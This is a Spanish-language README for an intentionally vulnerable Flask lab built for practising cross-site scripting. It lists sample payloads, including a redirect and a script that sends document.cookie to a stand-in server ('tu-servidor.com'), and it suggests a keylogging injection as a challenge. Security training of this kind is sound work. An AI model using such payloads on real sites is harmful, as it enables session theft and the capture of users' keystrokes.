# 🛡️ XSS Lab Interactive  
*Plataforma colaborativa para aprender y practicar vulnerabilidades XSS de forma segura y controlada*

![GitHub license](https://img.shields.io/github/license/infernoidpl4y/XSSLab)   
![Python](https://img.shields.io/badge/Python-3.x-blue)   
![Flask](https://img.shields.io/badge/Flask-2.x-orange)   
![OWASP](https://img.shields.io/badge/OWASP-Top_10-red)   

---

## 🎯 ¿Qué es XSS Lab?
Un entorno de aprendizaje práctico para estudiantes y profesionales de ciberseguridad, diseñado para **entender y practicar la explotación de vulnerabilidades XSS (Cross-Site Scripting)** en un entorno seguro y controlado.

> "No es solo destruir... es entender cómo funciona la seguridad web"  
> - InfernoidPl4y

---

## 🔧 Características Principales
- ✅ **Vulnerable intencionalmente** para pruebas de seguridad  
- 📚 Entorno controlado para experimentación segura  
- 💬 Sistema de publicaciones con inyección XSS en campo de texto  
- 🎨 Ejemplo predefinido: `!inject` para payloads básicos  
- 📉 Datos reiniciados automáticamente cada 48 horas  
- 🌐 Desplegable en plataformas como PythonAnywhere  
- 🤝 Diseñado para aprendizaje comunitario

---

## 📦 Tecnologías Utilizadas
- 🐍 **Python** (Flask framework)
- 💻 **HTML/CSS** (Frontend interactivo)
- 🔐 Enfoque en OWASP Top 10 (XSS específicamente)

🧪 Cómo Usarlo
Abre el navegador en http://localhost:5000
Crea una publicación con código XSS:
<script>alert('¡XSS básico!')</script>
Ejemplo rápido: Escribe !inject en el campo XSS para ver un payload predefinido
Observa el comportamiento y experimenta con diferentes payloads
⚠️ Aviso Importante
Solo para fines educativos
No introduzcas información sensible
Los datos se reinician periódicamente
🧠 Ejemplos de Payloads para Pruebas
Básico
html


1
<script>alert('XSS')</script>
Estilo Visual
html


1
2
3
⌄
<style>
  body { background: red; transition: all 2s; }
</style>
Redirección Silenciosa
html


1
<script>window.location.href='https://example.com'</script> 
Captura de Cookies (Ejemplo académico)
html
<script>
  fetch('https://tu-servidor.com/log?data='+document.cookie)
</script>
🧰 Desafíos Recomendados
Nivel Principiante
Crea una alerta que salte al cargar la página
Nivel Intermedio
Modifica el estilo de otra publicación
Nivel Avanzado
Inyecta un script que capture entradas del teclado
📸 Captura de Pantalla


🤝 Contribuciones
¡Las mejoras y contribuciones son bienvenidas!
Por favor lee el CONTRIBUTING.md para más detalles.

📄 Licencia
MIT License - ver LICENSE para detalles

📬 Contacto
InfernoidPl4y - infernoidpl4y@gmail.com
Portfolio: infernoidpl4y.netlify.app
